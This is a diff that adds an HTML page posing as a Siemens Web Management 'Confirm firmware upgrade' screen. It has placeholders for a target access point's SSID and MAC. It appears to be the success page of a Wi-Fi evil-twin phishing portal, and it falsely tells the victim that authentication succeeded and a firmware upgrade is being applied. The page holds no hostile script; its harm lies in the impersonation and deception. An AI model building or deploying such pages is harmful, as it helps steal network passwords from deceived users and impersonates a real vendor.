@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><title>Siemens Web Management</title>
+    <meta charset=utf-8>
+    <meta name=viewport content="width=device-width, initial-scale=1">
+    <link rel=stylesheet href=css/bootstrap.min.css>
+    <script src=js/jquery.min.js></script>
+    <script src=js/bootstrap.min.js></script><!-- CSS -->
+    <style type=text/css>
+
+        /* Sticky footer styles
+        -------------------------------------------------- */
+
+        html,
+        body {
+            height: 100%;
+            /* The html and body elements cannot have any padding or margin. */
+        }
+
+        .center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 65px;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+            #footer {
+                margin-left: -20px;
+                margin-right: -20px;
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class=container>
+    <img height="75" src="img/logo.png">
+    <div class="row" style="padding-left: 15px">
+        <div class="col-md-2" style="background-color: #cfd2d9; height: 50vh; padding: 0">
+            <div class="text-center" style="background-color: #afb4be; height: 10vh; padding-top: 4vh">
+                <span><b>Confirm firmware upgrade</b></span>
+            </div>
+        </div>
+        <div class="col-md-10" style="padding-left: 5px">
+            <div class="text-center" style="background-color: #cccccc; height: 10vh; padding-top: 4vh">
+                <span><b>$APTargetSSID ($APTargetMAC)</b></span>
+            </div>
+            <div class="text-center" style="background-color: #eaeaea; height: 40vh">
+                <h1 class="text-center" style="color: #cccccc; margin-top: 0; font-size: 75px; font-weight: bolder">
+                    AUTHENTICATED</h1>
+                <p style="margin-top: 50px">Successfully authenticated. The system is applying the firmware upgrade and
+                    connecting you to the network...</p>
+
+                <p style="margin-top: 50px">For information about browser compatibility please refer to the manual</p>
+            </div>
+        </div>
+    </div>
+</div> <!-- Start page content --> <!-- Start footer -->
+<footer style="margin-top: 50px">
+    <div class="container text-center"><p class=text-muted>© Siemens 1996 - 2021</p></div>
+</footer> <!-- End footer --> <!-- Start update first message -->
+</body>
+</html>
